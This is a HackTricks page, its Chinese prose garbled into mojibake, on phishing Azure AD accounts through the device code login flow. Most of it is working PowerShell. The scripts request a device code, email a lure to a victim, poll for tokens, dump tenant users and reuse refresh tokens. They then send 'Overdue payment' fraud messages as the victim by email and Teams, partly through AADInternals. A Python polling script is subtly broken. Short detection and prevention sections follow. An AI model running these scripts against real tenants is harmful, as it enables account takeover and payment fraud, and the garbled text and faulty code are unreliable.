# Az - è®¾å¤‡ä»£ç èº«ä»½éªŒè¯é’“é±¼

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

**æ­¤å¸–å­çš„å†…å®¹æ¥è‡ª** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### ä»€ä¹ˆæ˜¯è®¾å¤‡ä»£ç èº«ä»½éªŒè¯ <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

æ ¹æ®å¾®è½¯çš„[æ–‡æ¡£](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)ï¼Œè®¾å¤‡ä»£ç èº«ä»½éªŒè¯ï¼š

> å…è®¸ç”¨æˆ·ç™»å½•åˆ°è¾“å…¥å—é™è®¾å¤‡ï¼Œä¾‹å¦‚æ™ºèƒ½ç”µè§†ã€ç‰©è”ç½‘è®¾å¤‡æˆ–æ‰“å°æœºã€‚ä¸ºäº†å¯ç”¨æ­¤æµç¨‹ï¼Œè®¾å¤‡è¦æ±‚ç”¨æˆ·åœ¨å¦ä¸€å°è®¾å¤‡ä¸Šçš„æµè§ˆå™¨ä¸­è®¿é—®ä¸€ä¸ªç½‘é¡µè¿›è¡Œç™»å½•ã€‚ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼Œè®¾å¤‡å°±èƒ½å¤Ÿè·å–æ‰€éœ€çš„è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œã€‚

è¯¥è¿‡ç¨‹å¦‚ä¸‹ï¼š

1. ç”¨æˆ·åœ¨è®¾å¤‡ä¸Šå¯åŠ¨æ”¯æŒè®¾å¤‡ä»£ç æµçš„åº”ç”¨ç¨‹åº
2. åº”ç”¨ç¨‹åºè¿æ¥åˆ° Azure AD çš„ /devicecode ç«¯ç‚¹ï¼Œå¹¶å‘é€ **client\_id** å’Œ **resource**
3. Azure AD è¿”å› **device\_code**ã€**user\_code** å’Œ **verification\_url**
4. è®¾å¤‡å‘ç”¨æˆ·æ˜¾ç¤º **verification\_url** (hxxps://microsoft.com/devicelogin) å’Œ **user\_code**
5. ç”¨æˆ·æ‰“å¼€æµè§ˆå™¨å¹¶æµè§ˆåˆ° **verification\_url**ï¼Œåœ¨è¦æ±‚æ—¶æä¾› **user\_code** å¹¶ç™»å½•
6. è®¾å¤‡è½®è¯¢ Azure ADï¼Œç›´åˆ°æˆåŠŸç™»å½•åè·å– **access\_token** å’Œ **refresh\_token**

![è®¾å¤‡ä»£ç æµç¨‹](https://o365blog.com/images/posts/phishing\_5.png)

### ä½¿ç”¨è®¾å¤‡ä»£ç èº«ä»½éªŒè¯è¿›è¡Œé’“é±¼ <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

åˆ©ç”¨è®¾å¤‡ä»£ç èº«ä»½éªŒè¯è¿›è¡Œé’“é±¼çš„åŸºæœ¬æ€è·¯å¦‚ä¸‹ã€‚

1. æ”»å‡»è€…è¿æ¥åˆ° /devicecode ç«¯ç‚¹ï¼Œå¹¶å‘é€ **client\_id** å’Œ **resource**
2. åœ¨æ”¶åˆ° **verification\_uri** å’Œ **user\_code** åï¼Œåˆ›å»ºä¸€å°åŒ…å«æŒ‡å‘ **verification\_uri** å’Œ **user\_code** çš„é“¾æ¥çš„ç”µå­é‚®ä»¶ï¼Œå¹¶å°†å…¶å‘é€ç»™å—å®³è€…ã€‚
3. å—å®³è€…ç‚¹å‡»é“¾æ¥ï¼Œæä¾›ä»£ç å¹¶å®Œæˆç™»å½•ã€‚
4. æ”»å‡»è€…æ¥æ”¶åˆ° **access\_token** å’Œ **refresh\_token**ï¼Œç°åœ¨å¯ä»¥æ¨¡ä»¿å—å®³è€…ã€‚

#### 1. è¿æ¥åˆ° /devicecode ç«¯ç‚¹ <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

ç¬¬ä¸€æ­¥æ˜¯å‘ Azure AD çš„ devicecode ç«¯ç‚¹å‘å‡º HTTP POST è¯·æ±‚ï¼š
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
æˆ‘ä½¿ç”¨äº†ä»¥ä¸‹å‚æ•°ã€‚æˆ‘é€‰æ‹©ä½¿ç”¨â€œMicrosoft Officeâ€ client\_idï¼Œå› ä¸ºå®ƒçœ‹èµ·æ¥æ˜¯æœ€åˆæ³•çš„åº”ç”¨ç¨‹åºåç§°ï¼Œå¹¶ä¸”å¯ä»¥ç”¨äºè®¿é—®å…¶ä»–èµ„æºã€‚æ‰€é€‰èµ„æºæä¾›å¯¹AAD Graph APIçš„è®¿é—®æƒé™ï¼Œè¯¥APIç”±MSOnline PowerShellæ¨¡å—ä½¿ç”¨ã€‚

| å‚æ•°       | å€¼                                                     |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

å“åº”ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| å‚æ•°              | æè¿°                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | ç”¨æˆ·åœ¨è¯·æ±‚æ—¶è¾“å…¥çš„ä»£ç                                    |
| device\_code      | ç”¨äºâ€œè½®è¯¢â€èº«ä»½éªŒè¯ç»“æœçš„è®¾å¤‡ä»£ç                     |
| verification\_url | ç”¨æˆ·éœ€è¦æµè§ˆä»¥è¿›è¡Œèº«ä»½éªŒè¯çš„URL                         |
| expires\_in       | è¿‡æœŸæ—¶é—´ï¼ˆ15åˆ†é’Ÿï¼‰                                 |
| interval          | å®¢æˆ·ç«¯åº”è½®è¯¢èº«ä»½éªŒè¯çš„æ—¶é—´é—´éš”ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ |
| message           | é¢„æ ¼å¼åŒ–çš„æ¶ˆæ¯ï¼Œæ˜¾ç¤ºç»™ç”¨æˆ·                            |

ä»¥ä¸‹æ˜¯è¿æ¥åˆ°deviceloginç«¯ç‚¹çš„è„šæœ¬ï¼š
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
#### 2. åˆ›å»ºé’“é±¼é‚®ä»¶ <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†**verification\_url**ï¼ˆå§‹ç»ˆç›¸åŒï¼‰å’Œ**user\_code**ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå¹¶å‘é€é’“é±¼é‚®ä»¶ã€‚

**æ³¨æ„ï¼** å‘é€é‚®ä»¶éœ€è¦ä¸€ä¸ªå¯ç”¨çš„ SMTP æœåŠ¡ã€‚

ä»¥ä¸‹æ˜¯å‘å—å®³è€…å‘é€é’“é±¼é‚®ä»¶çš„è„šæœ¬ï¼š
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
æ”¶åˆ°çš„ç”µå­é‚®ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š![è®¾å¤‡ä»£ç æµç¨‹](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. â€œé’“é±¼â€ - å—å®³è€…æ‰§è¡Œèº«ä»½éªŒè¯ <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

å½“å—å®³è€…ç‚¹å‡»é“¾æ¥æ—¶ï¼Œä¼šå‡ºç°ä»¥ä¸‹ç½‘ç«™ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼ŒURLæ˜¯ä¸€ä¸ªåˆæ³•çš„Microsoft URLã€‚ç”¨æˆ·è¢«è¦æ±‚è¾“å…¥ç”µå­é‚®ä»¶ä¸­çš„ä»£ç ã€‚

![è®¾å¤‡ä»£ç ](https://o365blog.com/images/posts/phishing\_7.png)

è¾“å…¥ä»£ç åï¼Œç”¨æˆ·è¢«è¦æ±‚é€‰æ‹©è¦ç™»å½•çš„ç”¨æˆ·ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼Œç”¨æˆ·è¢«è¦æ±‚ç™»å½•åˆ°**Microsoft Office** - ä¸éœ€è¦ä»»ä½•åŒæ„ã€‚

**æ³¨æ„ï¼**å¦‚æœç”¨æˆ·æœªç™»å½•ï¼Œåˆ™ç”¨æˆ·éœ€è¦ä½¿ç”¨ç›®æ ‡ç»„ç»‡ä½¿ç”¨çš„ä»»ä½•æ–¹æ³•è¿›è¡Œç™»å½•ã€‚

![ç™»å½•](https://o365blog.com/images/posts/phishing\_8.png)

æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯åï¼Œå‘ç”¨æˆ·æ˜¾ç¤ºä»¥ä¸‹å†…å®¹ã€‚

![åˆ©æ¶¦](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **æ­¤æ—¶ç”¨æˆ·çš„èº«ä»½å·²è¢«æ³„éœ²ï¼** :warning:

#### 4. æ£€ç´¢è®¿é—®ä»¤ç‰Œ <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

æ”»å‡»è€…çš„æœ€åä¸€æ­¥æ˜¯æ£€ç´¢è®¿é—®ä»¤ç‰Œã€‚åœ¨å®Œæˆç¬¬2æ­¥ä¹‹åï¼Œæ”»å‡»è€…å¼€å§‹è½®è¯¢Azure ADä»¥è·å–èº«ä»½éªŒè¯çŠ¶æ€ã€‚

æ”»å‡»è€…éœ€è¦æ¯5ç§’å‘Azure ADä»¤ç‰Œç«¯ç‚¹å‘å‡ºHTTP POSTè¯·æ±‚ï¼š
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
è¯·æ±‚å¿…é¡»åŒ…å«ä»¥ä¸‹å‚æ•°ï¼ˆcodeæ˜¯ç¬¬1æ­¥ä¸­çš„device_codeï¼‰

| å‚æ•°         | å€¼                                                                                                                                                                                                              |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

å¦‚æœèº«ä»½éªŒè¯å¤„äºç­‰å¾…çŠ¶æ€ï¼Œåˆ™è¿”å›httpé”™è¯¯**400 Bad Request**ï¼Œå†…å®¹å¦‚ä¸‹ï¼š
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä»¥ä¸‹å“åº”ï¼ˆä»¤ç‰Œå·²æˆªæ–­ï¼‰ï¼š
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
ä»¥ä¸‹è„šæœ¬è¿æ¥åˆ°Azure ADä»¤ç‰Œç«¯ç‚¹å¹¶è½®è¯¢èº«ä»½éªŒè¯çŠ¶æ€ã€‚

```python
import requests
import time

# Azure AD token endpoint
token_endpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Client ID and redirect URI for the application
client_id = "YOUR_CLIENT_ID"
redirect_uri = "YOUR_REDIRECT_URI"

# Request parameters
params = {
    "client_id": client_id,
    "redirect_uri": redirect_uri,
    "response_type": "device_code",
    "scope": "openid",
}

# Request device code
response = requests.post(token_endpoint, data=params)
data = response.json()

# Check if device code is received
if "device_code" in data:
    device_code = data["device_code"]
    user_code = data["user_code"]
    verification_uri = data["verification_uri"]

    print(f"Please authenticate using the following code: {user_code}")
    print(f"Verification URL: {verification_uri}")

    # Poll for authentication status
    while True:
        time.sleep(data["interval"])
        response = requests.post(token_endpoint, data=params)
        data = response.json()

        if "access_token" in data:
            access_token = data["access_token"]
            print(f"Access token: {access_token}")
            break
        elif "error" in data:
            error = data["error"]
            print(f"Error: {error}")
            break
```

è¯¥è„šæœ¬è¿æ¥åˆ°Azure ADä»¤ç‰Œç«¯ç‚¹å¹¶è½®è¯¢èº«ä»½éªŒè¯çŠ¶æ€ã€‚
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è®¿é—®ä»¤ç‰Œæ¥å†’å……å—å®³è€…ï¼š
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
åªè¦client\_idä¿æŒä¸å˜ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œæ¥è·å–å…¶ä»–æœåŠ¡çš„è®¿é—®ä»¤ç‰Œã€‚

ä»¥ä¸‹è„šæœ¬è·å–Exchange Onlineçš„è®¿é—®ä»¤ç‰Œã€‚
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## ä½¿ç”¨ AADInternals è¿›è¡Œé’“é±¼æ”»å‡» <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternalsï¼ˆv0.4.4 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰å…·æœ‰ä¸€ä¸ª [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) å‡½æ•°ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–é’“é±¼è¿‡ç¨‹ã€‚

é’“é±¼æ¶ˆæ¯å¯ä»¥è‡ªå®šä¹‰ï¼Œä»¥ä¸‹æ˜¯é»˜è®¤æ¶ˆæ¯ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
é»˜è®¤çš„ç”µå­é‚®ä»¶æ¶ˆæ¯ï¼š\
![é’“é±¼é‚®ä»¶](https://o365blog.com/images/posts/phishing\_11.png)

é»˜è®¤çš„ Teams æ¶ˆæ¯ï¼š\
![é’“é±¼æ¶ˆæ¯](https://o365blog.com/images/posts/phishing\_12.png)

### ç”µå­é‚®ä»¶ <a href="#email" id="email"></a>

ä»¥ä¸‹ç¤ºä¾‹ä½¿ç”¨è‡ªå®šä¹‰æ¶ˆæ¯å‘é€é’“é±¼ç”µå­é‚®ä»¶ã€‚ä»¤ç‰Œå°†ä¿å­˜åˆ°ç¼“å­˜ä¸­ã€‚
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼“å­˜çš„ä»¤ç‰Œä»¥å—å®³è€…çš„èº«ä»½å‘é€ç”µå­é‚®ä»¶ã€‚
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
æˆ‘ä»¬è¿˜å¯ä»¥å‘é€ä¸€æ¡Teamsæ¶ˆæ¯ï¼Œä»¥ä½¿ä»˜æ¬¾è¯·æ±‚æ›´åŠ ç´§æ€¥ï¼š
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**ä»¥ä¸‹è§†é¢‘å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨AADInternalsè¿›è¡Œç”µå­é‚®ä»¶é’“é±¼ã€‚**

### Teams <a href="#teams" id="teams"></a>

AADInternalsæ”¯æŒå°†é’“é±¼æ¶ˆæ¯å‘é€ä¸ºTeamsèŠå¤©æ¶ˆæ¯ã€‚

**æ³¨æ„ï¼**åœ¨å—å®³è€…â€œè®¤è¯â€å¹¶æ¥æ”¶åˆ°ä»¤ç‰Œåï¼ŒAADInternalså°†æ›¿æ¢åŸå§‹æ¶ˆæ¯ã€‚å¯ä»¥ä½¿ç”¨-CleanMessageå‚æ•°æä¾›æ­¤æ¶ˆæ¯ã€‚

é»˜è®¤çš„æ¸…ç†æ¶ˆæ¯æ˜¯ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

ä»¥ä¸‹ç¤ºä¾‹ä½¿ç”¨è‡ªå®šä¹‰æ¶ˆæ¯å‘é€é’“é±¼é‚®ä»¶ã€‚ä»¤ç‰Œä¿å­˜åœ¨ç¼“å­˜ä¸­ã€‚
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**ä»¥ä¸‹è§†é¢‘å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨AADInternalsè¿›è¡ŒTeamsé’“é±¼ã€‚**

## æ£€æµ‹ <a href="#detecting" id="detecting"></a>

é¦–å…ˆï¼Œä»Azure ADçš„è§’åº¦æ¥çœ‹ï¼Œç™»å½•å‘ç”Ÿåœ¨**å‘èµ·**èº«ä»½éªŒè¯çš„åœ°æ–¹ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„è§‚ç‚¹éœ€è¦ç†è§£ã€‚è¿™æ„å‘³ç€åœ¨ç™»å½•æ—¥å¿—ä¸­ï¼Œç™»å½•æ˜¯ä»**æ”»å‡»è€…çš„ä½ç½®å’Œè®¾å¤‡**è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„ä½ç½®å’Œè®¾å¤‡ã€‚

ç„¶è€Œï¼Œä½¿ç”¨åˆ·æ–°ä»¤ç‰Œè·å–çš„è®¿é—®ä»¤ç‰Œ**ä¸ä¼šå‡ºç°åœ¨ç™»å½•æ—¥å¿—ä¸­ï¼**

ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæˆ‘ä»Azure VMï¼ˆæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ä»[äº‘shell](https://o365blog.com/post/cloudshell/)ï¼‰å‘èµ·äº†é’“é±¼æ”»å‡»ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼Œä½¿ç”¨â€œMicrosoft Officeâ€å®¢æˆ·ç«¯çš„ç™»å½•å‘ç”Ÿåœ¨ä¸Šåˆ7:23ï¼Œæ¥è‡ªIPåœ°å€51.144.240.233ã€‚ç„¶è€Œï¼Œåœ¨ä¸Šåˆ7:27è·å–Exchange Onlineçš„è®¿é—®ä»¤ç‰Œå¹¶æ²¡æœ‰æ˜¾ç¤ºåœ¨æ—¥å¿—ä¸­ã€‚

![Azure ADç™»å½•æ—¥å¿—](https://o365blog.com/images/posts/phishing\_10.png)

:warning: å¦‚æœæœ‰è¿¹è±¡è¡¨æ˜ç”¨æˆ·æ­£åœ¨ä»éå…¸å‹ä½ç½®ç™»å½•ï¼Œç”¨æˆ·å¸æˆ·å¯èƒ½å·²è¢«å…¥ä¾µã€‚

## é¢„é˜² <a href="#preventing" id="preventing"></a>

é˜²æ­¢ä½¿ç”¨æ­¤æŠ€æœ¯è¿›è¡Œé’“é±¼çš„å”¯ä¸€æœ‰æ•ˆæ–¹æ³•æ˜¯ä½¿ç”¨[æ¡ä»¶è®¿é—®](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)ï¼ˆCAï¼‰ç­–ç•¥ã€‚å…·ä½“æ¥è¯´ï¼Œ**æ— æ³•é˜²æ­¢é’“é±¼**ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ ¹æ®ç‰¹å®šè§„åˆ™**é˜»æ­¢ç”¨æˆ·ç™»å½•**ã€‚ç‰¹åˆ«æ˜¯åŸºäºä½ç½®å’Œè®¾å¤‡çŠ¶æ€çš„ç­–ç•¥å¯¹äºä¿æŠ¤å¸æˆ·éå¸¸æœ‰æ•ˆã€‚è¿™é€‚ç”¨äºå½“å‰ä½¿ç”¨çš„æ‰€æœ‰é’“é±¼æŠ€æœ¯ã€‚

ç„¶è€Œï¼Œä¸å¯èƒ½æ¶µç›–æ‰€æœ‰æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨å¤šé‡èº«ä»½éªŒè¯ç™»å½•ï¼Œåˆ™å¼ºåˆ¶è¦æ±‚ä»éæ³•ä½ç½®ç™»å½•ä¸èµ·ä½œç”¨ã€‚

## ç¼“è§£ <a href="#mitigating" id="mitigating"></a>

å¦‚æœç”¨æˆ·å·²è¢«å…¥ä¾µï¼Œå¯ä»¥[æ’¤é”€](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)ç”¨æˆ·çš„åˆ·æ–°ä»¤ç‰Œï¼Œä»è€Œé˜²æ­¢æ”»å‡»è€…ä½¿ç”¨è¢«å…¥ä¾µçš„åˆ·æ–°ä»¤ç‰Œè·å–æ–°çš„è®¿é—®ä»¤ç‰Œã€‚

## æ€»ç»“ <a href="#summary" id="summary"></a>

æ®æˆ‘æ‰€çŸ¥ï¼Œè®¾å¤‡ä»£ç èº«ä»½éªŒè¯æµæŠ€æœ¯ä»¥å‰å°šæœªç”¨äºé’“é±¼ã€‚

ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§æ–¹æ³•æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼š

* ä¸éœ€è¦æ³¨å†Œä»»ä½•åº”ç”¨ç¨‹åº
* ä¸éœ€è¦è®¾ç½®ç”¨äºä¼ªé€ ç™»å½•é¡µé¢ç­‰çš„é’“é±¼åŸºç¡€è®¾æ–½
* ç”¨æˆ·åªéœ€ç™»å½•ï¼ˆé€šå¸¸æ˜¯â€œMicrosoft Officeâ€ï¼‰- ä¸éœ€è¦æˆæƒ
* æ‰€æœ‰æ“ä½œéƒ½åœ¨**login.microsoftonline.com**å‘½åç©ºé—´ä¸­è¿›è¡Œ
* æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»ä½•client\_idå’Œèµ„æºï¼ˆä¸è¿‡å¹¶éæ‰€æœ‰ç»„åˆéƒ½æœ‰æ•ˆï¼‰
* å¦‚æœç”¨æˆ·ä½¿ç”¨å¤šé‡èº«ä»½éªŒè¯ç™»å½•ï¼Œåˆ™è®¿é—®ä»¤ç‰Œä¹Ÿå…·æœ‰å¤šé‡èº«ä»½éªŒè¯å£°æ˜ï¼ˆåŒ…æ‹¬ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œè·å–çš„è®¿é—®ä»¤ç‰Œï¼‰
* é˜²æ­¢éœ€è¦æ¡ä»¶è®¿é—®ï¼ˆä»¥åŠAzure AD Premium P1/P2è®¸å¯è¯ï¼‰

ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§æ–¹æ³•è‡³å°‘æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼š

* ç”¨æˆ·ä»£ç ä»…æœ‰æ•ˆ15åˆ†é’Ÿ

å½“ç„¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘å¤šä¸ªæ”¶ä»¶äººå‘é€é’“é±¼ç”µå­é‚®ä»¶æ¥å‡å°‘æ—¶é—´é™åˆ¶ - è¿™å°†å¢åŠ æœ‰äººä½¿ç”¨ä»£ç ç™»å½•çš„æ¦‚ç‡ã€‚

